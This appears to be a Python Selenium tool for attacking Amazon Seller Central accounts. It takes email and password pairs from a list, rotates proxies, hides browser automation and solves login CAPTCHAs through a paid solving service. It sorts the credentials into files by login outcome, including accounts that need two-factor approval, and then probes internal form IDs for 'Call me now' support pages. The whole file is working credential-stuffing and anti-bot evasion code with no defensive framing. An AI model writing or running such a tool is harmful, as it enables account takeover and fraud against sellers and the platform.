import names, os, random, string, phonenumbers, warnings
from captcha_solver import CaptchaSolver
from selenium.webdriver import Keys
clear = lambda: os.system('cls')
clear()
from threading import Thread
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
import random_address
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.wait import WebDriverWait
import phone_iso3166.country as countries
clear()
warnings.filterwarnings("ignore", category=DeprecationWarning)
global url1
url1="https://sellercentral.amazon.com/performance/account/health/contact-us?formid=99"
def get_driver():
    chrome_options = webdriver.ChromeOptions()
    # chrome_options = uc.ChromeOptions()
    with open('vpn.txt', 'r') as e:
        proxy = e.readline()
        e.close()
    with open('vpn.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('vpn.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    with open('vpn.txt', 'a') as e:
        e.write(proxy)
        e.close()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    print(Fore.RED + 'proxy : ' + Fore.GREEN + proxy)
    # chrome_options.experimental_options["prefs"] = {
    #     "profile.managed_default_content_settings.images": 2,
    #     "profile.managed_default_content_settings.stylesheets": 2,
    #     # "profile.managed_default_content_settings.javascript": 2,
    #     "profile.managed_default_content_settings.geolocation": 2,
    #     "profile.default_content_setting_values.notifications": 2,
    # }
    # if headless==0:
    #     chrome_options.add_argument("--headless")
    # chrome_options.add_extension('so.crx')
    # chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--lang=en-US")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--mute-audio")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("--clear-token-service")
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument("--aggressive-cache-discard")
    chrome_options.add_argument("--disable-cache")
    chrome_options.add_argument("--disable-application-cache")
    chrome_options.add_argument("--disable-offline-load-stale-cache")
    chrome_options.add_argument("--disable-3d-apis")
    chrome_options.add_argument("--disable-gpu-shader-disk-cache")
    chrome_options.add_argument("--media-cache-size=0")
    chrome_options.add_argument("--disk-cache-size=0")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    # chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    # chrome_options.add_argument("--user-agent= Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--window-size=700,700")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    # driver = uc.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.delete_all_cookies()
    return driver

def readEmail():
    with open('Emails.txt', 'r') as e:
        EmailData = e.readline()
        e.close()
    with open('Emails.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('Emails.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    # with open('positions/positionEmails.txt', 'r') as e:
    #     position= e.readline()
    #     e.close()
    # with open('Emails.txt', 'r') as e:
    #     e.seek(int(position))
    #     EmailData = e.readline()
    #     if EmailData=="" or EmailData==" " :
    #         position=0
    #     else:
    #         position = e.tell()
    # with open('positions/positionEmails.txt', 'w') as e:
    #     e.write(str(position))
    #     e.close()
    return EmailData

def StartLogin(driver, EmailData):
    # try:
        Email, Pass = str(EmailData).split('|')
        print(Fore.BLUE+"[=] Start Withe >>> "+Email+Fore.RESET)
        driver.get(url1)
        # WebDriverWait(driver, 100).until(EC.presence_of_all_elements_located)
        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')
        if 'ap_password' in driver.page_source:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        else:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email, Keys.RETURN)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source or "auth-captcha-image-container" in driver.page_source or 'alt="CAPTCHA"' in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            sleep(0.2)
            with open(f"trash/{result_str}.png", "ab") as file:
                captcha_img = WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                file.write(captcha_img.screenshot_as_png)
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            sleep(0.2)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            with open(f"trash/{result_str}.png", "ab") as file:
                captcha_img = WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                file.write(captcha_img.screenshot_as_png)
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
            sleep(0.2)
            os.remove(f'trash/{result_str}.png')
        sleep(0.3)
        if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
            if "Enter the characters as they are given in the challenge" in driver.page_source:
                print(
                    Fore.LIGHTRED_EX + "[!] error captcha" + Fore.RESET)
                with open("error captcha.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
            else:
                print(
                    Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Blocked!" + Fore.RESET)
                with open("AccountBlocked.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
        sleep(0.3)
        try:
            driver.find_element(By.XPATH,
                                "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
        except:
            pass

        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')
        if "For your security, approve the notification sent to:" in driver.page_source :
            with open("sellerCenter.txt",'a') as f :
                 f.write(Email+"|"+Pass)
            print(Fore.YELLOW + " seller Center " + Email + Fore.RESET)
            driver.quit()
        else:

            if 'Select a Merchant and Marketplace'in driver.page_source:
                sleep(0.5)
                driver.find_element(By.XPATH,
                                    '//*[@id="picker-container"]/div/div[2]/div/div[3]/div/div[1]/button').click()
                sleep(0.3)
                driver.find_element(By.XPATH,
                                    '//*[@id="picker-container"]/div/div[3]/div/button').click()
                sleep(0.2)
            for i in range(7950,10000):
                print("Try this Number >>>> "+str(i))
                url=f"https://sellercentral.amazon.com/hill/website/form/{i}?hill_locale="
                driver.get(url)
                sleep(5)
                driver.implicitly_wait(100)

                if "Call me now" in driver.page_source:
                    open('urls.txt' , 'a').write(url)
                    print(Fore.GREEN+"Goood"+Fore.RESET)
                else:
                    print(Fore.RED+"Baaad"+Fore.RESET)



EmailData=readEmail()
driver=get_driver()
StartLogin(driver, EmailData)